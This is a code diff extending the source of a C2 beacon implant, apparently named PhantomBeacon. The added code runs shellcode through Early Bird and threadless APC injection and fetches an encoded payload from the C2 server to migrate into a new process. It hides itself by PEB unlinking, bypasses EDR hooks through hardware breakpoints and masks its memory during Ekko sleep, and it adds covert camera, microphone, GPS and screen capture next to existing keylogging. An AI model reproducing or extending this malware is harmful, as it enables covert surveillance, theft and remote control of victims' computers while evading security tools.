@@ -39,13 +39,18 @@
 #include <cstdio>
 #include <ctime>
 #include <string>
+#include <vector>
 #include <sstream>
 #include <fstream>
 #include <algorithm>
 #include <functional>
+#include <utility>
+#include <thread>
+#include <atomic>
 
 #include "build_id.h"
 #include "c2_config.h"
+#include "config_encrypted.h"
 #include "evasion.h"
 #include "crypto.h"
 #include "network.h"
@@ -55,6 +60,11 @@
 #include "persistence.h"
 
 #include "screenshot.h"
+#include "media_utils.h"
+#include "gps.h"
+#include "camera.h"
+#include "audio.h"
+#include "screen_record.h"
 #include "injection.h"
 #include "proxy.h"
 #include "browser_pivot.h"
@@ -63,12 +73,16 @@
 #include "cdp_pivot.h"
 #ifdef _WIN32
 #include "sleep_mask.h"
+#include "sleep_ekko.h"
 #include "stack_spoof.h"
 #include "smb.h"
+#include "apc_injection.h"
+#include "peb_unlink.h"
 #endif
 #include "wlan_scan.h"
 #include "bt_scan.h"
 #include "inmemory.h"
+#include "secure_heap.h"
 
 // ── Minimal JSON Parser ────────────────────────────────────────────────────
 // We avoid pulling in nlohmann/json to keep the binary tiny.
@@ -88,7 +102,15 @@ inline std::string get_string(const std::string& json, const std::string& key) {
     if (start_quote == std::string::npos) return "";
     start_quote++;
 
-    size_t end_quote = json.find('"', start_quote);
+    // Scan for the closing quote, skipping escaped \" so values may contain
+    // quotes (e.g. shell commands with embedded quotes).
+    size_t end_quote = std::string::npos;
+    bool escaped = false;
+    for (size_t i = start_quote; i < json.size(); ++i) {
+        if (escaped) { escaped = false; continue; }
+        if (json[i] == '\\') { escaped = true; continue; }
+        if (json[i] == '"') { end_quote = i; break; }
+    }
     if (end_quote == std::string::npos) return "";
 
     std::string val = json.substr(start_quote, end_quote - start_quote);
@@ -127,12 +149,26 @@ inline std::vector<Task> parse_tasks(const std::string& json) {
     size_t arr_start = json.find('[', key_pos);
     if (arr_start == std::string::npos) return tasks;
 
-    // Find each { ... } object in the array
+    // Find each { ... } object in the array, honoring strings: a } inside a
+    // quoted command must not terminate the object.
     size_t pos = arr_start;
     while (true) {
         size_t obj_start = json.find('{', pos);
         if (obj_start == std::string::npos) break;
-        size_t obj_end = json.find('}', obj_start);
+        size_t obj_end = std::string::npos;
+        bool in_str = false, esc = false;
+        for (size_t i = obj_start + 1; i < json.size(); ++i) {
+            if (in_str) {
+                if (esc) { esc = false; }
+                else if (json[i] == '\\') { esc = true; }
+                else if (json[i] == '"') { in_str = false; }
+            } else if (json[i] == '"') {
+                in_str = true;
+            } else if (json[i] == '}') {
+                obj_end = i;
+                break;
+            }
+        }
         if (obj_end == std::string::npos) break;
 
         std::string obj = json.substr(obj_start, obj_end - obj_start + 1);
@@ -177,10 +213,14 @@ std::string run_shell_command(const std::string& cmd) {
     si.hStdError = hWrite;
 
     PROCESS_INFORMATION pi = { 0 };
-    // Use cmd.exe /c to support built-ins and pipes
+    // Use cmd.exe /c to support built-ins and pipes.
+    // CreateProcessA may modify the command-line buffer in place — it MUST
+    // be a writable copy, never .c_str() of a const std::string.
     std::string full_cmd = XOR_DEC(XOR_STR("cmd.exe /c ")).c_str() + cmd;
-    
-    if (CreateProcessA(nullptr, (LPSTR)full_cmd.c_str(), nullptr, nullptr, TRUE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
+    std::vector<char> cmd_buf(full_cmd.begin(), full_cmd.end());
+    cmd_buf.push_back('\0');
+
+    if (CreateProcessA(nullptr, cmd_buf.data(), nullptr, nullptr, TRUE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
         CloseHandle(hWrite);
         char buffer[4096];
         DWORD bytesRead;
@@ -229,15 +269,118 @@ std::string run_shell_command(const std::string& cmd) {
     return output;
 }
 
+// ── Task Watchdog ──────────────────────────────────────────────────────────
+// A blocking task (camera Media Foundation ReadSample, a long media
+// capture, a hung shell pipe) must NEVER wedge the whole beacon loop:
+// while a task is stuck the beacon stops checking in, the C2 shows the
+// task as "sent" forever, and every later task (gps, screenshot, ...)
+// queues up behind it. Run each task on a worker thread with a bounded
+// wait; on timeout the task is reported as failed-with-reason and the
+// loop moves on (the stuck worker is detached and left to die).
+
+std::string dispatch_command(const std::string& cmd, net::C2Config& cfg);
+
+struct TaskRun {
+    std::string output;
+    std::atomic<bool> done{false};
+};
+
+static void _task_worker(TaskRun* tr, const std::string& cmd, net::C2Config& cfg) {
+    tr->output = dispatch_command(cmd, cfg);
+    tr->done = true;
+}
+
+// Default budget: most commands (whoami, ls, sysinfo, wlan-scan, ...) finish
+// in a second. Media captures take longer and carry their own duration, so
+// the caller can raise the budget per-command.
+static const int DEFAULT_TASK_TIMEOUT_MS = 30000;
+
+static std::string run_task_with_timeout(const std::string& cmd, net::C2Config& cfg,
+                                         int timeout_ms = DEFAULT_TASK_TIMEOUT_MS) {
+    TaskRun tr;
+    std::thread worker(_task_worker, &tr, cmd, std::ref(cfg));
+    // Poll with short sleeps so a Ctrl+C / shutdown still lands promptly.
+    int waited = 0;
+    const int STEP = 100;
+    while (!tr.done && waited < timeout_ms) {
+        Sleep(STEP);
+        waited += STEP;
+    }
+    if (tr.done) {
+        worker.join();
+        return tr.output;
+    }
+    // Timed out: the worker is still blocked somewhere (camera driver hang,
+    // pipe never closing). Detach it so the beacon keeps polling; the result
+    // is discarded but the C2 sees a clear "task timeout" instead of a
+    // permanently "sent" task.
+    worker.detach();
+    std::string head = cmd.substr(0, 48);
+    return "[TASK_TIMEOUT] '" + head + "' exceeded " +
+           std::to_string(timeout_ms / 1000) + "s — task aborted, beacon continues\n";
+}
+
 // ── Command Dispatcher ─────────────────────────────────────────────────────
 
-std::string dispatch_command(const std::string& cmd, const net::C2Config& cfg = net::C2Config()) {
+// Health counters (written by the main loop, read by the `health` command)
+static unsigned long g_checkins_ok = 0, g_checkins_fail = 0, g_tasks_done = 0;
+static unsigned long long g_uptime_start = 0;
+static std::string g_last_error;
+
+std::string dispatch_command(const std::string& cmd, net::C2Config& cfg) {
     // Parse command and arguments
     std::istringstream iss(cmd);
     std::string action;
     iss >> action;
 
-    if (action == XOR_DEC(XOR_STR("recon")).c_str()) {
+    if (action == XOR_DEC(XOR_STR("edrcheck")).c_str()) {
+#ifdef _WIN32
+        // EDR situational awareness: userland hooks, known EDR drivers.
+        // Read-only — run this FIRST on a new foothold.
+        edrcheck::EdrReport rep;
+        edrcheck::report(rep);
+        std::ostringstream o;
+        o << "ntdll_hooks=" << (rep.ntdll_hooked ? "YES" : "no")
+          << " (" << rep.hooked_stubs << " stubs)\n"
+          << "known_edr_drivers=" << rep.known_edr << "\n";
+        if (rep.known_edr > 0) o << rep.drivers;
+        o << "etw_ti=" << (rep.etw_ti_alive ? "assumed-alive" : "no") << "\n";
+        return o.str();
+#else
+        return "edrcheck: windows only\n";
+#endif
+    }
+    if (action == XOR_DEC(XOR_STR("health")).c_str()) {
+        // Beacon health self-report: cadence, uptime, counters, last error.
+        unsigned long long now = (unsigned long long)time(nullptr);
+        unsigned long long up = g_uptime_start ? (now - g_uptime_start) : 0;
+        std::ostringstream o;
+        o << "uptime_s=" << up
+          << " checkins_ok=" << g_checkins_ok
+          << " checkins_fail=" << g_checkins_fail
+          << " tasks_done=" << g_tasks_done
+          << " sleep_ms=" << cfg.sleep_ms
+          << " jitter=" << cfg.jitter << "%"
+          << " build=" << BUILD_ID;
+        if (!g_last_error.empty()) o << " last_error=\"" << g_last_error << "\"";
+        return o.str();
+    }
+    else if (action == XOR_DEC(XOR_STR("set-sleep")).c_str()) {
+        // C2-driven cadence rotation mid-session (no beacon restart):
+        // set-sleep <ms> [jitter%]
+        int ms = -1, jit = -1;
+        if (iss >> ms) { if (!(iss >> jit)) jit = cfg.jitter; }
+        if (ms <= 0) return "Usage: set-sleep <ms> [jitter%]";
+        if (jit < 0) jit = 0;
+        if (jit > 100) jit = 100;
+        cfg.sleep_ms = ms;
+        cfg.base_sleep_ms = ms;
+        cfg.jitter = jit;
+        g_last_error = "";   // cadence rotation implies a healthy operator link
+        return "Cadence set: " + std::to_string(ms) + "ms (jitter " +
+               std::to_string(jit) + "%)";
+    }
+    else if (action == XOR_DEC(XOR_STR("recon")).c_str()) {
         std::string path;
         std::getline(iss >> std::ws, path);
         return recon::format_human(path);
@@ -270,10 +413,10 @@ std::string dispatch_command(const std::string& cmd, const net::C2Config& cfg = 
     }
     else if (action == XOR_DEC(XOR_STR("whoami")).c_str()) {
 #ifdef _WIN32
-        char user[256], computer[256];
+        char user[256] = {0}, computer[256] = {0};
         DWORD usize = sizeof(user), csize = sizeof(computer);
-        GetUserNameA(user, &usize);
-        GetComputerNameA(computer, &csize);
+        if (!GetUserNameA(user, &usize)) strncpy(user, "unknown", sizeof(user) - 1);
+        if (!GetComputerNameA(computer, &csize)) strncpy(computer, "unknown", sizeof(computer) - 1);
         return std::string(XOR_DEC(XOR_STR("User: ")).c_str()) + user + XOR_DEC(XOR_STR("\nComputer: ")).c_str() + computer + XOR_DEC(XOR_STR("\n")).c_str();
 #else
         char hostname[256] = {0};
@@ -431,7 +574,36 @@ std::string dispatch_command(const std::string& cmd, const net::C2Config& cfg = 
 #endif
     }
     else if (action == XOR_DEC(XOR_STR("sleep")).c_str()) {
-        return XOR_DEC(XOR_STR("SLEEP_SET")).c_str();
+        // sleep <ms> [jitter%] — reconfigure the beacon cadence at runtime.
+        int ms = -1;
+        int jit = -1;
+        if (iss >> ms) { if (!(iss >> jit)) jit = cfg.jitter; }
+        if (ms <= 0) return XOR_DEC(XOR_STR("Usage: sleep <ms> [jitter%] (e.g. sleep 30000 10)")).c_str();
+        if (jit < 0) jit = 0;
+        if (jit > 100) jit = 100;
+        cfg.sleep_ms = ms;
+        cfg.base_sleep_ms = ms;
+        cfg.jitter = jit;
+        return XOR_DEC(XOR_STR("Sleep set to ")).c_str() + std::to_string(ms) +
+               XOR_DEC(XOR_STR("ms (jitter ")).c_str() + std::to_string(jit) +
+               XOR_DEC(XOR_STR("%)")).c_str();
+    }
+    else if (action == XOR_DEC(XOR_STR("auth-rotate")).c_str()) {
+#if BEACON_AUTH_ENABLED
+        std::string encoded_secret;
+        iss >> encoded_secret;
+        auto next_secret = crypto::base64_decode(encoded_secret);
+        if (next_secret.size() != crypto::AUTH_SECRET_LEN) {
+            return "AUTH_ROTATE_ERROR: expected a 32-byte base64 secret";
+        }
+        if (!crypto::save_auth_secret(next_secret.data(), next_secret.size())) {
+            return "AUTH_ROTATE_ERROR: secure state storage failed";
+        }
+        std::copy(next_secret.begin(), next_secret.end(), cfg.auth_secret.begin());
+        return "AUTH_ROTATED";
+#else
+        return "AUTH_ROTATE_ERROR: beacon authentication is not enabled";
+#endif
     }
     else if (action == XOR_DEC(XOR_STR("keylog")).c_str()) {
         std::string subCmd;
@@ -469,6 +641,12 @@ std::string dispatch_command(const std::string& cmd, const net::C2Config& cfg = 
 #endif
             auto code = crypto::base64_decode(b64code);
             for (auto& b : code) b ^= 0xAA;
+#ifdef _WIN32
+            // Prefer threadless APC (no new thread) — stealthiest first.
+            if (apc::threadless_apc(pid, code))
+                return XOR_DEC(XOR_STR("Injected via threadless APC (no new thread).")).c_str();
+            // Fallback: remote thread injection
+#endif
             std::string result = injection::inject_shellcode(pid, code);
             return result;
         }
@@ -485,15 +663,45 @@ std::string dispatch_command(const std::string& cmd, const net::C2Config& cfg = 
             }
             return result;
         }
+#ifdef _WIN32
+        // Argument-less migrate: SELF-MIGRATION. Pull the PIC loader blob
+        // (beacon.bin — same bytes that ran in-memory at deployment) from
+        // the C2 with the embedded payload token, inject it into a
+        // sacrificial suspended process, and exit this instance. The new
+        // beacon re-checks-in with the same identity; the server-side
+        // nonce-based replay guard accepts it (counter reset is expected
+        // after a migration/restart).
+        {
+            // /x serves the XOR(0xAA)-wrapped loader+PE blob — the exact
+            // bytes the deployment dropper executes in-memory.
+            std::string pic_xored = net::http_request(cfg,
+                XOR_WDEC(XOR_WSTR(L"GET")).c_str(),
+                XOR_WDEC(XOR_WSTR(L"/x")).c_str(), "", "");
+            if (pic_xored.size() < 4096) {
+                return "MIGRATE_ERROR: failed to fetch PIC payload from C2 (" +
+                       std::to_string(pic_xored.size()) + " bytes)";
+            }
+            auto code = std::vector<unsigned char>(pic_xored.begin(), pic_xored.end());
+            for (auto& b : code) b ^= 0xAA;
+            std::string result = injection::migrate_to_new_process(code);
+            if (result.find("Migrated successfully") != std::string::npos) {
+                return std::string("\x01\x02MG") + result +
+                       " (self-migrated from C2 PIC payload)";
+            }
+            return "MIGRATE_ERROR: " + result;
+        }
+#else
         return XOR_DEC(XOR_STR("Usage: migrate <base64_shellcode>")).c_str();
+#endif
     }
     else if (action == XOR_DEC(XOR_STR("mem-run")).c_str()) {
 #ifdef _WIN32
         std::string b64code;
         if (iss >> b64code) {
             auto code = crypto::base64_decode(b64code);
-            if (inmemory::run_shellcode(code)) return XOR_DEC(XOR_STR("Shellcode executed in memory.")).c_str();
-            return XOR_DEC(XOR_STR("In-memory execution failed.")).c_str();
+            std::string err;
+            if (inmemory::run_shellcode(code, &err)) return XOR_DEC(XOR_STR("Shellcode executed in memory.")).c_str();
+            return "MEM_RUN_ERROR: " + err;
         }
         return XOR_DEC(XOR_STR("Usage: mem-run <base64_shellcode>")).c_str();
 #else
@@ -506,8 +714,76 @@ std::string dispatch_command(const std::string& cmd, const net::C2Config& cfg = 
         return XOR_DEC(XOR_STR("Usage: mem-run <base64_binary>")).c_str();
 #endif
     }
+#ifdef _WIN32
+    else if (action == XOR_DEC(XOR_STR("inject-eb")).c_str()) {
+        // Early Bird APC: shellcode runs BEFORE the target's entry point.
+        // Usage: inject-eb <exe_path> <base64_shellcode>
+        std::string exePath, b64code;
+        if (iss >> exePath >> b64code) {
+            auto code = crypto::base64_decode(b64code);
+            for (auto& b : code) b ^= 0xAA;
+            std::wstring wpath(exePath.begin(), exePath.end());
+            if (apc::early_bird_apc(wpath, code))
+                return XOR_DEC(XOR_STR("Early Bird APC injection succeeded.")).c_str();
+            return XOR_DEC(XOR_STR("Early Bird APC injection failed.")).c_str();
+        }
+        return XOR_DEC(XOR_STR("Usage: inject-eb <exe_path> <base64_shellcode>")).c_str();
+    }
+    else if (action == XOR_DEC(XOR_STR("inject-tl")).c_str()) {
+        // Threadless APC: shellcode queued on EXISTING threads (no new thread).
+        // Usage: inject-tl <pid> <base64_shellcode>
+        DWORD pid;
+        std::string b64code;
+        if (iss >> pid >> b64code) {
+            if (pid == GetCurrentProcessId())
+                return XOR_DEC(XOR_STR("Self-injection not allowed.")).c_str();
+            auto code = crypto::base64_decode(b64code);
+            for (auto& b : code) b ^= 0xAA;
+            if (apc::threadless_apc(pid, code))
+                return XOR_DEC(XOR_STR("Threadless APC injection succeeded.")).c_str();
+            return XOR_DEC(XOR_STR("Threadless APC injection failed.")).c_str();
+        }
+        return XOR_DEC(XOR_STR("Usage: inject-tl <pid> <base64_shellcode>")).c_str();
+    }
+#endif
     else if (action == "screenshot") {
         return screenshot::capture();
+    }
+    else if (action == "gps") {
+        return media_gps::get_gps_info();
+    }
+    else if (action == "camera") {
+        return media_camera::capture_image();
+    }
+    else if (action == "audio") {
+        std::string duration;
+        try {
+            if (iss >> duration) {
+                return media_audio::record_audio(std::stoi(duration));
+            }
+        } catch (...) { /* invalid argument: fall back to default */ }
+        return media_audio::record_audio(5);
+    }
+    else if (action == "screen-record") {
+        std::string duration;
+        try {
+            if (iss >> duration) {
+                return media_screen::record_screen_passive(std::stoi(duration));
+            }
+        } catch (...) { /* fall back to default */ }
+        return media_screen::record_screen_passive(5);
+    }
+    else if (action == "screen-record-live") {
+        std::string duration;
+        try {
+            if (iss >> duration) {
+                return media_screen::record_screen_live(std::stoi(duration));
+            }
+        } catch (...) { /* fall back to default */ }
+        return media_screen::record_screen_live(5);
+    }
+    else if (action == "screen-dump") {
+        return media_screen::dump_live_recording();
     }
     else if (action == XOR_DEC(XOR_STR("socks")).c_str()) {
         int localPort;
@@ -534,7 +810,11 @@ std::string dispatch_command(const std::string& cmd, const net::C2Config& cfg = 
         if (iss >> localPort) {
             unsigned long pid = 0;
             std::string pidStr;
-            if (iss >> pidStr) pid = std::stoul(pidStr);
+            if (iss >> pidStr) {
+                try {
+                    pid = std::stoul(pidStr);
+                } catch (...) { pid = 0; }
+            }
             return browser_pivot::start_pivot(localPort, pid);
         }
         return XOR_DEC(XOR_STR("Usage: browser-pivot <local_port> [pid]")).c_str();
@@ -613,7 +893,7 @@ std::string dispatch_command(const std::string& cmd, const net::C2Config& cfg = 
 
 std::string generate_beacon_id() {
 #ifdef _WIN32
-    char computer[256];
+    char computer[256] = {0};
     DWORD csize = sizeof(computer);
     GetComputerNameA(computer, &csize);
     char hex[9];
@@ -639,15 +919,50 @@ extern "C" void beacon_main(int argc, char** argv) {
 #endif
 
 #ifdef _WIN32
+    // ── Single-instance guard ────────────────────────────────────────────
+    // The no-disk RunKey rebirth can fire while an earlier beacon instance
+    // is still alive (logon while the operator session runs): two beacons
+    // with the SAME HMAC identity double-poll, race tasks and break the
+    // server's nonce tracking. A per-identity mutex in the user session
+    // makes the duplicate exit silently within seconds.
+    {
+        std::string mux = std::string("Local\\PhantomBeacon-") +
+#ifdef BEACON_AUTH_ENABLED
+            BEACON_AUTH_ID;
+#else
+            "default";
+#endif
+        HANDLE hMux = CreateMutexA(nullptr, TRUE, mux.c_str());
+        if (hMux && GetLastError() == ERROR_ALREADY_EXISTS) {
+            ReleaseMutex(hMux);
+            CloseHandle(hMux);
+            return;   // duplicate birth — let the senior instance work
+        }
+        // hMux intentionally leaked: held for process lifetime.
+    }
+
     srand(static_cast<unsigned>(time(nullptr)) ^ GetCurrentProcessId());
     WSADATA wsa;
     if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return;
+    #ifndef DISABLE_ANTI
+    // Hide beacon from PEB module lists (Process Explorer / EDR module walk)
+    peb_unlink::hide_module();
+    // HW-breakpoint unhooking: arm a debug register on a clean ntdll
+    // 'syscall; ret' gadget and route sensitive syscalls through the VEH
+    // so EDR userland hooks are bypassed WITHOUT patching ntdll .text
+    // (nothing for the integrity monitor to flag).
+    anti::install_hwbp_engine();
+    #endif
 #else
     srand(static_cast<unsigned>(time(nullptr)) ^ getpid());
 #endif
 
     net::C2Config cfg;
+#if BEACON_AUTH_ENABLED
+    cfg.beacon_id = BEACON_AUTH_ID;
+#else
     cfg.beacon_id = generate_beacon_id();
+#endif
 #ifdef _WIN32
     cfg.host      = std::wstring(C2_HOST, C2_HOST + strlen(C2_HOST));
 #else
@@ -655,6 +970,7 @@ extern "C" void beacon_main(int argc, char** argv) {
 #endif
     cfg.port      = C2_PORT;
     cfg.sleep_ms  = 5000;
+    cfg.base_sleep_ms = 5000;
     cfg.jitter    = 30;
 
     if (argc >= 2) {
@@ -667,20 +983,48 @@ extern "C" void beacon_main(int argc, char** argv) {
         if (argc >= 3) cfg.port = std::atoi(argv[2]);
         if (argc >= 4) cfg.use_https = std::atoi(argv[3]) != 0;
     }
+#if BEACON_AUTH_ENABLED
+    std::vector<BYTE> persisted_auth_secret;
+    if (crypto::load_auth_secret(persisted_auth_secret)) {
+        std::copy(persisted_auth_secret.begin(), persisted_auth_secret.end(),
+                  cfg.auth_secret.begin());
+    }
+#endif
 
     bool alive = true;
     auto escape_json = [](const std::string& s) {
         std::string res;
-        for (char c : s) {
+        for (unsigned char c : s) {
             if (c == '"') res += "\\\"";
             else if (c == '\\') res += "\\\\";
             else if (c == '\n') res += "\\n";
             else if (c == '\r') res += "\\r";
             else if (c == '\t') res += "\\t";
-            else res += c;
+            else if (c < 0x20) {
+                // raw control bytes are invalid in JSON: encode as \u00XX
+                char hex[7];
+                snprintf(hex, sizeof(hex), "\\u%04X", c);
+                res += hex;
+            }
+            else res += static_cast<char>(c);
         }
         return res;
     };
+
+    // Failed results are retained in order. A single failed upload must not
+    // overwrite results produced by later tasks in the same check-in.
+    std::vector<std::pair<std::string, std::string>> pending_results;
+    int consecutive_failures = 0;
+
+    // ── Health self-report counters ────────────────────────────────────
+    unsigned long checkins_ok = 0, checkins_fail = 0, tasks_done = 0;
+    unsigned long results_pending_peak = 0;
+    unsigned long long uptime_start = (unsigned long long)time(nullptr);
+    unsigned long long last_cfg_update = 0;
+    std::string last_error;
+
+    // mirror into the globals the `health` command reads
+    g_uptime_start = uptime_start;
 
     while (alive) {
         std::string telemetry = std::string(XOR_DEC(XOR_STR("{\"build_id\":\"")).c_str()) + BUILD_ID +
@@ -690,9 +1034,44 @@ extern "C" void beacon_main(int argc, char** argv) {
         std::string response = net::checkin(cfg, telemetry);
 
         if (!response.empty()) {
+            consecutive_failures = 0;
+            ++checkins_ok;
+            g_checkins_ok = checkins_ok;
+            // server reachable again: restore the operator-configured base
+            // sleep (exponential backoff from the outage must not stick)
+            if (cfg.sleep_ms != cfg.base_sleep_ms) cfg.sleep_ms = cfg.base_sleep_ms;
+            // Retry previously undelivered results first. Remove an item only
+            // after the transport reports success; the server de-duplicates
+            // retries if the response itself was lost.
+            for (auto it = pending_results.begin(); it != pending_results.end();) {
+                if (net::send_result(cfg, it->first, it->second)) {
+                    it = pending_results.erase(it);
+                } else {
+                    break;
+                }
+            }
             auto tasks = json_mini::parse_tasks(response);
             for (auto& task : tasks) {
-                std::string output = dispatch_command(task.command, cfg);
+                ++tasks_done;
+                g_tasks_done = tasks_done;
+                // Per-command budget: media captures run for the operator-
+                // requested duration plus a margin; everything else gets the
+                // default (a camera ReadSample hang must not wedge the loop).
+                int budget_ms = DEFAULT_TASK_TIMEOUT_MS;
+                {
+                    std::istringstream tss(task.command);
+                    std::string tok;
+                    tss >> tok;
+                    int dur = 0;
+                    tss >> dur;
+                    if ((tok == "audio" || tok == "screen-record" ||
+                         tok == "screen-record-live") && dur > 0) {
+                        budget_ms = dur * 1000 + 15000;
+                    } else if (tok == "camera") {
+                        budget_ms = 45000; // MF init + frame grabs can be slow
+                    }
+                }
+                std::string output = run_task_with_timeout(task.command, cfg, budget_ms);
                 if (output.size() >= 4 && output[0] == '\x01' && output[1] == '\x02') {
                     if (output[2] == 'E' && output[3] == 'X') {
                         alive = false;
@@ -700,21 +1079,59 @@ extern "C" void beacon_main(int argc, char** argv) {
                     }
                     if (output[2] == 'M' && output[3] == 'G') {
                         output = output.substr(4);
-                        net::send_result(cfg, task.task_id, output);
+                        if (!net::send_result(cfg, task.task_id, output)) {
+                            pending_results.emplace_back(task.task_id, output);
+                        }
                         alive = false;
                         break;
                     }
                 }
-                net::send_result(cfg, task.task_id, output);
+                if (!net::send_result(cfg, task.task_id, output)) {
+                    pending_results.emplace_back(task.task_id, output);
+                }
+            }
+#ifdef _WIN32
+            // smb-pipe commands accepted on the named pipe are drained here
+            // (they are regular beacon commands executed locally)
+            std::string piped;
+            while ((piped = smb::pop_pending_command()) != "") {
+                std::string out = run_task_with_timeout(piped, cfg);
+                if (!net::send_result(cfg, XOR_DEC(XOR_STR("smb-pipe")).c_str(), out)) {
+                    pending_results.emplace_back(XOR_DEC(XOR_STR("smb-pipe")).c_str(), out);
+                }
+            }
+#endif
+        } else {
+            // server unreachable: exponential backoff, capped at 60s
+            consecutive_failures++;
+            ++checkins_fail;
+            g_checkins_fail = checkins_fail;
+            last_error = "checkin fail #" + std::to_string(consecutive_failures);
+            g_last_error = last_error;
+            if (consecutive_failures > 1) {
+                cfg.sleep_ms = std::min(60000, cfg.sleep_ms * 2);
             }
         }
+        if (pending_results.size() > results_pending_peak)
+            results_pending_peak = (unsigned long)pending_results.size();
 
         int jitter_sleep = cfg.get_sleep_ms();
-        while (jitter_sleep > 0) {
-            keylogger::poll();
-            Sleep(20);
-            jitter_sleep -= 20;
-        }
+#ifdef _WIN32
+        // Masked sleep (Ekko upgrade): RC4-encrypts RW sections AND the live
+        // thread stack, spoofs the return chain to a signed-module address,
+        // then waits on a high-resolution timer. A memory scan during sleep
+        // sees ciphertext; a stack scan sees legitimate system frames.
+        #ifndef DISABLE_ANTI
+        ekko::ekko_sleep_masked(jitter_sleep);
+        #else
+        Sleep(jitter_sleep);
+        #endif
+#else
+        // Linux/macOS: plain sleep (no EDR to evade); keylogger runs in
+        // its own thread.
+        Sleep(jitter_sleep);
+#endif
+        keylogger::poll();
     }
 
 #ifdef _WIN32
